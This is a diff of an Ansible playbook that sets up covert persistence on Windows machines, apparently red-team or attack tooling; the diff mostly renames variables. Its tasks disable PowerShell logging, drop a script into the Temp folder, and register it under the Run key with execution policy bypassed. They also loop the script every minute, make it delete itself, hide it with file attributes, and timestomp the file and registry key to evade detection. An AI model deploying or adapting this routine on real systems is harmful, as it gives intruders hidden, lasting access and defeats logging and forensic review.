@@ -1,8 +1,8 @@
 ---
-- name: Define variables for paths and filenames
-  set_fact:
-    script_dest: "C:\\Windows\\Temp\\firewall_script1.ps1"
-    run_key_name: "DoubleTapScript"
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_ps1_loop_script_dest: "C:\\Windows\\Temp\\firewall_script1.ps1"
+#    doubletap_ps1_loop_run_key_name: "DoubleTapScript"
 
 - name: Disable PowerShell logging by modifying the registry
   win_registry:
@@ -15,25 +15,25 @@
 - name: Copy PowerShell script to target
   win_copy:
     src: "files/doubletap.ps1"
-    dest: "{{ script_dest }}"
+    dest: "{{ doubletap_ps1_loop_script_dest }}"
 
 - name: Add script to Run registry key to execute at startup
   win_regedit:
     path: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    name: "{{ run_key_name }}"
-    data: "powershell.exe -ExecutionPolicy Bypass -File {{ script_dest }}"
+    name: "{{ doubletap_ps1_loop_run_key_name }}"
+    data: "powershell.exe -ExecutionPolicy Bypass -File {{ doubletap_ps1_loop_script_dest }}"
     state: present
 
 - name: Ensure PowerShell script runs every 60 seconds by adding a loop at the start and end
   win_lineinfile:
-    path: "{{ script_dest }}"
+    path: "{{ doubletap_ps1_loop_script_dest }}"
     line: |
       while ($true) {
     insertafter: "^(# Start)$"
 
 - name: Add start-sleep and closing brace to end of the PowerShell script
   win_lineinfile:
-    path: "{{ script_dest }}"
+    path: "{{ doubletap_ps1_loop_script_dest }}"
     line: |
       Start-Sleep -Seconds 60
       }
@@ -41,28 +41,28 @@
 
 - name: Add script deletion at the end of the PowerShell script
   win_lineinfile:
-    path: "{{ script_dest }}"
+    path: "{{ doubletap_ps1_loop_script_dest }}"
     line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
     insertafter: 'Log " My work here is done"''
 
 - name: Apply hidden and system attributes to the PowerShell script
   win_shell: |
-    attrib +h +s "{{ script_dest }}"
+    attrib +h +s "{{ doubletap_ps1_loop_script_dest }}"
 
 - name: Timestomp script and task to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "{{ script_dest }}").CreationTime = $time
-    (Get-Item "{{ script_dest }}").LastWriteTime = $time
-    (Get-Item "{{ script_dest }}").LastAccessTime = $time
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").CreationTime = $time
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").LastWriteTime = $time
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").LastAccessTime = $time
   args:
     executable: powershell.exe
 
 - name: Timestomp registry key to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ run_key_name }}").CreationTime = $time
-    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ run_key_name }}").LastWriteTime = $time
-    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ run_key_name }}").LastAccessTime = $time
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").CreationTime = $time
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").LastWriteTime = $time
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").LastAccessTime = $time
   args:
     executable: powershell.exe
